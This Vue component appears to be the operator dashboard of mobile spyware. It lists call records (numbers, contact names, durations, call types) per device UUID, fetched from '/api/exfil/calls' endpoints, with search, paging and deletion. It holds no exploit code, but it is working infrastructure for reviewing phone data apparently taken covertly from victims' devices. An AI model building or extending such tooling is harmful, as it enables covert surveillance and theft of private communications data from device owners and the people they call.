<template>
  <div class="calls">
    <el-card>
      <div class="search-bar">
        <el-input v-model="filters.device_uuid" placeholder="设备UUID" style="width: 250px;" />
        <el-input v-model="filters.phone" placeholder="号码" style="width: 150px;" />
        <el-select v-model="filters.type" placeholder="类型">
          <el-option label="全部" value="" />
          <el-option label="来电" value="incoming" />
          <el-option label="去电" value="outgoing" />
          <el-option label="未接" value="missed" />
        </el-select>
        <el-button type="primary" @click="loadCalls">查询</el-button>
        <el-button @click="resetFilters">重置</el-button>
      </div>
      
      <el-table :data="callsData" border v-loading="loading">
        <el-table-column prop="id" label="ID" width="80" />
        <el-table-column prop="device_uuid" label="设备UUID" width="250" />
        <el-table-column prop="phone" label="号码" />
        <el-table-column prop="name" label="姓名" />
        <el-table-column prop="duration" label="时长(秒)" width="100" />
        <el-table-column prop="type" label="类型" width="100">
          <template #default="scope">
            <el-tag :type="getCallType(scope.row.type)">{{ getCallTypeName(scope.row.type) }}</el-tag>
          </template>
        </el-table-column>
        <el-table-column prop="created_at" label="时间" width="180" />
        <el-table-column label="操作" width="100">
          <template #default="scope">
            <el-button size="small" type="danger" @click="deleteItem(scope.row.id)">删除</el-button>
          </template>
        </el-table-column>
      </el-table>
      
      <el-pagination
        @size-change="handleSizeChange"
        @current-change="handleCurrentChange"
        :current-page="pagination.page"
        :page-sizes="[10, 20, 50]"
        :page-size="pagination.size"
        :total="pagination.total"
        layout="total, sizes, prev, pager, next, jumper"
      />
    </el-card>
  </div>
</template>

<script setup>
import { ref, reactive } from 'vue'
import axios from '../utils/axios'

const callsData = ref([])
const loading = ref(false)

const filters = reactive({
  device_uuid: '',
  phone: '',
  type: ''
})

const pagination = reactive({
  page: 1,
  size: 20,
  total: 0
})

function getCallType(type) {
  const types = { 'incoming': 'success', 'outgoing': 'info', 'missed': 'danger' }
  return types[type] || 'info'
}

function getCallTypeName(type) {
  const names = { 'incoming': '来电', 'outgoing': '去电', 'missed': '未接' }
  return names[type] || type
}

async function loadCalls() {
  loading.value = true
  try {
    const params = new URLSearchParams()
    params.append('skip', (pagination.page - 1) * pagination.size)
    params.append('limit', pagination.size)
    if (filters.device_uuid) params.append('device_uuid', filters.device_uuid)
    if (filters.phone) params.append('phone', filters.phone)
    if (filters.type) params.append('type', filters.type)
    
    const response = await axios.get(`/api/exfil/calls?${params}`)
    callsData.value = response.data
  } catch (error) {
    console.error('加载数据失败:', error)
  } finally {
    loading.value = false
  }
}

async function deleteItem(id) {
  if (!confirm('确定要删除这条记录吗？')) return
  try {
    await axios.delete(`/api/exfil/${id}`)
    loadCalls()
  } catch (error) {
    console.error('删除失败:', error)
  }
}

function resetFilters() {
  filters.device_uuid = ''
  filters.phone = ''
  filters.type = ''
  loadCalls()
}

function handleSizeChange(size) {
  pagination.size = size
  pagination.page = 1
  loadCalls()
}

function handleCurrentChange(page) {
  pagination.page = page
  loadCalls()
}

loadCalls()
</script>

<style scoped>
.search-bar {
  display: flex;
  gap: 10px;
  margin-bottom: 20px;
  flex-wrap: wrap;
}
</style>
